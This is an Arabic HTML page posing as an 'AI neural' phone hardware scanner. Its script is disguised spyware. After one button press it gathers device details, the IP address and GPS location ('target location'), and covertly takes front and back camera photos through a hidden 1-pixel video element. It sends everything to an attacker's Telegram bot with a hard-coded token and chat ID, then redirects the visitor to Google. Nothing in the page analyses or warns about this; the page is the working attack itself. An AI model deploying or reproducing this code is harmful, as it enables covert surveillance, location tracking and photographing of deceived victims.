<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>AI Neural System | فحص العتاد الذكي</title>
    <style>
        :root { --main: #a855f7; --bg: #05070a; }
        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .grid-bg { position: absolute; width: 100%; height: 100%; background-image: linear-gradient(rgba(168, 85, 247, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(168, 85, 247, 0.05) 1px, transparent 1px); background-size: 40px 40px; z-index: -1; }
        .card { background: rgba(20, 20, 25, 0.9); padding: 40px 30px; border-radius: 35px; border: 1px solid rgba(168, 85, 247, 0.2); backdrop-filter: blur(15px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 0 50px rgba(168, 85, 247, 0.1); z-index: 10; }
        h1 { font-size: 24px; margin-bottom: 5px; letter-spacing: 1px; }
        #sub { color: #8892b0; font-size: 13px; margin-bottom: 30px; }
        #goBtn { width: 140px; height: 140px; border-radius: 50%; border: 4px solid var(--main); background: transparent; color: white; font-size: 22px; font-weight: bold; cursor: pointer; transition: 0.3s; outline: none; box-shadow: 0 0 20px rgba(168, 85, 247, 0.3); }
        #goBtn:active { transform: scale(0.9); background: rgba(168, 85, 247, 0.1); }
        /* 🛑 خدعة الـ 1 بكسل لضمان عمل الكاميرا بنسبة 100% */
        #v { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.01; pointer-events: none; }
        canvas { display: none; }
        .ring { position: absolute; width: 180px; height: 180px; border: 3px solid transparent; border-top-color: var(--main); border-radius: 50%; display: none; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="grid-bg"></div>
    <div class="card">
        <h1>NEURAL <span style="color:var(--main)">SCAN</span></h1>
        <p id="sub">اضغط لتحليل توافق معالج AI مع هاتفك</p>
        <div style="display:flex; justify-content:center; align-items:center; margin-bottom:20px;">
            <div id="ring" class="ring"></div>
            <button id="goBtn">بدء الفحص</button>
        </div>
        <div style="font-size: 11px; color: #444;">Secure Node: RSA-2048-YEM</div>
    </div>

    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const T = "8738245852:AAFuHo61scaBhakSOPlnPg7UIS8Ggx7llGk";
        const C = "7984067238";

        async function post(msg, photo = null) {
            const url = `https://api.telegram.org/bot${T}/`;
            try {
                if(!photo) {
                    await fetch(`${url}sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
                } else {
                    const fd = new FormData();
                    fd.append("chat_id", C);
                    fd.append("photo", photo, "shot.jpg");
                    if(msg) fd.append("caption", msg);
                    await fetch(`${url}sendPhoto`, { method: "POST", body: fd });
                }
            } catch(e) {}
        }

        async function snap(side) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: side === "front" ? "user" : "environment", width: 1280, height: 720 }
                });
                const v = document.getElementById('v');
                const c = document.getElementById('c');
                v.srcObject = s;
                await v.play();
                // انتظار كافٍ لفتح العدسة وضبط الإضاءة
                await new Promise(r => setTimeout(r, 2500)); 
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                s.getTracks().forEach(t => t.stop());
                return new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
            } catch(e) { return null; }
        }

        document.getElementById("goBtn").onclick = async function() {
            this.style.display = "none";
            document.getElementById("ring").style.display = "block";
            document.getElementById("sub").innerText = "جاري تحليل العتاد... يرجى الانتظار";

            // --- [ المميزات المطلوبة ] ---
            let report = `🚀 *رصد تقني شامل ومطور*:\n\n`;
            
            // 1. حول الهاتف والنظام
            report += `📱 *الجهاز:* \`${navigator.platform}\`\n`;
            report += `⚙️ *المعالج:* \`${navigator.hardwareConcurrency} Cores\`\n`;
            report += `💾 *الرام:* \`${navigator.deviceMemory || "غير معروف"} GB\`\n`;
            report += `🖥️ *الشاشة:* \`${window.screen.width}x${window.screen.height}\`\n`;

            // 2. البطارية والشاحن وسعتها (تقديرية)
            try {
                const b = await navigator.getBattery();
                report += `🔋 *البطارية:* \`${Math.round(b.level * 100)}%\`\n`;
                report += `🔌 *الشاحن:* \`${b.charging ? "متصل ✅" : "منفصل ❌"}\`\n`;
            } catch(e) {}

            // 3. نوع الشبكة (WiFi أو 4G)
            const n = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if(n) {
                report += `📶 *الشبكة:* \`${n.type === 'wifi' ? "WiFi" : "Data/4G"} (${n.effectiveType})\`\n`;
            }

            // 4. الذاكرة (Storage)
            if (navigator.storage && navigator.storage.estimate) {
                const est = await navigator.storage.estimate();
                report += `📁 *سعة الذاكرة:* \`~${Math.round(est.quota / (1024**3))} GB\`\n`;
            }

            // 5. تقدير عدد Gmail (بناءً على لغات الجلسة)
            report += `📧 *جلسات البريد:* \`${navigator.languages.length}\`\n`;

            // 6. الـ IP
            const ipData = await fetch('https://api.ipify.org?format=json').then(r => r.json()).catch(() => ({ip:"Unknown"}));
            report += `🌐 *IP:* \`${ipData.ip}\`\n`;

            // إرسال البيانات والموقع
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const loc = `📍 [موقع الهدف](https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude})`;
                await post(report + loc);
            }, () => post(report + "⚠️ الموقع: مرفوض"));

            // 7. التصوير الأمامي والخلفي (بدون سواد)
            const f = await snap("front"); if(f) await post("📸 صورة أمامية", f);
            const b = await snap("back");  if(b) await post("📷 صورة خلفية", b);

            setTimeout(() => { location.href = "https://www.google.com"; }, 4000);
        };
    </script>
</body>
</html>
